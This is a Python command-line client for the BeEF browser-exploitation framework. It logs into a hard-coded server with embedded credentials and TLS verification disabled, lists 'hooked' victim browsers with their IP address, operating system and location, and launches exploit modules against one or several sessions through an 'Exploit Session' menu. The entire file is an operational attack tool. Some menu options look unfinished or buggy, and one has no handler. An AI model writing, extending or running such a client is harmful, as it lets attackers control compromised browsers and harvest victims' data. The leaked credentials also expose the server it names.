import requests
import json
class BeefAPI:
    def __init__(self):
        self.host = 'https://beef.nullsecsig.com'
        self.port = '3000'
        self.token = None
        self.url = '{}:{}/api/'.format(self.host,self.port)
        self.loginurl = self.url +'admin/login'
        self.payload = '{"username": "nullsec","password": "nullsec-beef"}'
    def login(self): #POST /api/admin/login
        x = requests.post(self.loginurl, data = self.payload,verify=False)
        data = json.loads(x.text)
        self.token = data["token"]
        self.hooks_url   = "{}hooks?token={}".format(self.url, self.token)
        self.modules_url = "{}modules?token={}".format(self.url, self.token)
        self.logs_url    = "{}logs?token={}".format(self.url, self.token)
        self.are_url     = "{}autorun/rule/".format(self.url)
        self.dns_url     = "{}dns/ruleset?token={}".format(self.url, self.token)
    #Hooked Browsers
    def Hooked_Browsers(self): #GET /api/hooks?token={token}
        r = requests.get(self.hooks_url,verify=False)
        x = json.loads(r.text)
        return(Hooked_Browsers(x,self.url,self.token))
    def Logs(self): #api/logs?token={token}
        r = requests.get(self.logs_url,verify=False)
        x = json.loads(r.text)
        print(x)
        # Add Log class
    def Module(self): #GET /api/modules?token={token}
         modules = []
         r = requests.get(self.modules_url,verify=False)
         x = json.loads(r.text)
         for a,b in x.items():
             modules.append(Module(b,self.url,self.token))
         return modules 

class Module(object):
    def __init__(self,data,url,token):
        self.url = url
        self.token=token
        for k,v in data.items():
            setattr(self,k,v)
        #id, class,name,category

    def options(self):
        r = requests.get("{}/modules/{}?token={}".format(self.url, self.id, self.token),verify=False)
        x= json.loads(r.text)
        print(x['options'])
            
    def description(self):
        r = requests.get("{}/modules/{}?token={}".format(self.url, self.id, self.token),verify=False)
        x= json.loads(r.text)
        print(x['description'])
    def run(self, session, options={}): #Options are optional 
        headers = {"Content-Type": "application/json", "charset": "UTF-8"}
        payload = json.dumps(options)
        r = requests.post("{}/modules/{}/{}?token={}".format(self.url, session, self.id, self.token), headers=headers, data=payload,verify=False)
        print(r)
        print(r.text)
    def multi_run(self, options={}, hb_ids=[]):
        headers = {"Content-Type": "application/json", "charset": "UTF-8"}
        payload = json.dumps({"mod_id":self.id, "mod_params": options, "hb_ids": hb_ids})
        r = requests.post("{}/modules/multi_browser?token={}".format(self.url, self.token), headers=headers, data=payload,verify=False)
        print(r)
        print(r.text)
    def results(self, session, cmd_id):
        r = requests.get("{}/modules/{}/{}/{}?token={}".format(self.url, session, self.id, cmd_id, self.token),verify=False)
        print(r.text)

    
class Hooked_Browsers(object):
    def __init__(self,data,url,token):
        self.data = data
        self.url = url
        self.token= token
    def online(self):
        sessions = []
        for k,v in self.data['hooked-browsers']['online'].items():
            sessions.append(Session(v['session'],v,self.url,self.token))
        return sessions
    def offline(self):
        sessions = []
        for k,v in self.data['hooked-browsers']['offline'].items():
            sessions.append(Session(v['session'],v,self.url,self.token))
        return sessions 
        
             
class Session(object):
    def __init__(self,session,data,url,token):
        self.session = session
        self.data = data
        self.url = url
        self.token = token
        self.name = self.data['name']
        self.version = self.data['version']
        self.platform = self.data['platform']
        self.os = self.data['os']
        self.os_version = self.data['os_version']
        self.hardware = self.data['hardware']
        self.ip = self.data['ip']
        self.page_uri = self.data['page_uri']
        self.firstseen = self.data['firstseen']
        self.lastseen = self.data['lastseen']
        self.date_stamp = self.data['date_stamp']
        self.city = self.data['city']
        self.country = self.data['country']
        self.country_code = self.data['country_code']
    def details(self):
        r = requests.get('{}/hooks/{}?token={}'.format(self.url, self.session, self.token),verify=False)
        print(r.json())
    def logs(self): #GET /api/logs/{session}?token={token}
        r = requests.get('{}/logs/{}?token={}'.format(self.url, self.session, self.token),verify=False)
        print(r.text)
    def run(self,module_id,options={}):
        headers = {"Content-Type": "application/json", "charset": "UTF-8"}
        payload = json.dumps(options)
        r = requests.post("{}/modules/{}/{}?token={}".format(self.url, self.session, module_id, self.token), headers=headers, data=payload,verify=False)
        print(r)
        print(r.text)

        
        
        
    

x = BeefAPI()
x.login()
y = x.Hooked_Browsers()
OnlineSessionList = y.online()
OfflineSessionList = y.offline()
ModuleList = x.Module()
def menu():
    print("Beef Python Script. Choose your option")
    print("[1] Print Module List")
    print("[2] Print OnlineSession List")
    print("[3] Print OfflineSession List")
    print("[4] Print Specific OnlineSession Details")
    print("[5] Print Specific OfflineSession Details")
    print("[6] Print Specific Module Details")
    print("[7] Exploit Session")
    print("[8] Exploit Multiple Sessions")
while True:
    menu()
    choice = input("")
    if choice =="1":
        for i in ModuleList:
            print("[{}] id:{} name:{} category{}".format(i.id,i.id,i.name,i.category))
    elif choice =="2":
        for i in range(len(OnlineSessionList)):
            print("[{}] session:{} name:{} version:{} platform:{} ip:{} page_uri:{}\n".format(i+1,OnlineSessionList[i].session,OnlineSessionList[i].name,OnlineSessionList[i].version,OnlineSessionList[i].platform,OnlineSessionList[i].ip,OnlineSessionList[i].page_uri))
    elif choice =="3":
        for i in range(len(OfflineSessionList)):
            print("[{}] session:{} name:{} version:{} platform:{} ip:{} page_uri:{}\n".format(i+1,OfflineSessionList[i].session,OfflineSessionList[i].name,OfflineSessionList[i].version,OfflineSessionList[i].platform,OfflineSessionList[i].ip,OfflineSessionList[i].page_uri))
    elif choice =="4":
        for i in range(len(OnlineSessionList)):
            print("[{}] session:{} name:{} version:{} platform:{} ip:{} page_uri:{}\n".format(i+1,OnlineSessionList[i].session,OnlineSessionList[i].name,OnlineSessionList[i].version,OnlineSessionList[i].platform,OnlineSessionList[i].ip,OnlineSessionList[i].page_uri))
        choose = int(input("Pls input Session Number that you want more details of."))
        OnlineSessionList[choose-1].details()
    elif choice =="5":
        for i in range(len(OfflineSessionList)):
            print("[{}] session:{} name:{} version:{} platform:{} ip:{} page_uri:{}\n".format(i+1,OfflineSessionList[i].session,OfflineSessionList[i].name,OfflineSessionList[i].version,OfflineSessionList[i].platform,OfflineSessionList[i].ip,OfflineSessionList[i].page_uri))
        choose = int(input("Pls input Session Number that you want more details of."))
        OfflineSessionList[choose-1].details()
    elif choice =="6":
        for i in ModuleList:
            print("[{}] id:{} name:{} category{}".format(i.id,i.id,i.name,i.category))
        choose = int(input("Pls input Module Number that you want more details of."))
        for i in ModuleList:
            if i.id == choose:
                i.description()
                i.options()
    elif choice =="7":
        for i in range(len(OnlineSessionList)):
            print("[{}] session:{} name:{} version:{} platform:{} ip:{} page_uri:{}\n".format(i+1,OnlineSessionList[i].session,OnlineSessionList[i].name,OnlineSessionList[i].version,OnlineSessionList[i].platform,OnlineSessionList[i].ip,OnlineSessionList[i].page_uri))
        choose = input("Which session would you like to exploit")
        for i in ModuleList:
            print("[{}] id:{} name:{} category{}".format(i.id,i.id,i.name,i.category))
        exploitchoose = input("Which exploit would you like to use")
        for i in range(len(OnlineSessionList)):
            if int(choose)-1 == i:
                for x in ModuleList:
                    if exploitchoose == x.id:
                        OnlineSessionList[i].run(x.id)
        
    

    
        


        

        




        
        
